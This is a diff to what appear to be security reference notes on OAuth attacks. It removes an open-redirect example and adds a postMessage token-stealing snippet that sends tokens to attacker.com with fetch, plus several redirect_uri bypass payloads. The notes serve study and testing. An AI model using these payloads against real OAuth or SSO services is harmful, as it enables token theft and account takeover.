@@ -86,11 +86,24 @@ app.get('/oauth/login', (req, res) => {
 ### 3. Open Redirect in redirect_uri
 
 ```
-# If the server accepts redirect_uri with open redirect:
-https://target.com/oauth/callback?redirect=/../../evil.com
-
 # The authorization code is sent to the attacker's domain
 ```
+
+### [NEW] Token Stealing via postMessage (SSO)
+**How it works:** Some SSO providers send the token back to the window.opener via `postMessage`. If the origin is not validated, any site that opens the provider can steal the token.
+**Attack:**
+```javascript
+window.addEventListener("message", (event) => {
+    // Missing check: if (event.origin !== "trusted.com") return;
+    fetch("https://attacker.com/steal?token=" + event.data.token);
+}, false);
+```
+
+### [NEW] Redirect URI Bypasses
+**Attack Variants:**
+- `redirect_uri=trusted.com/callback@attacker.com`
+- `redirect_uri=trusted.com\.attacker.com`
+- `redirect_uri=https://trusted.com#@attacker.com/callback` (Fragment trick)
 
 See: [[open-redirect]]
 
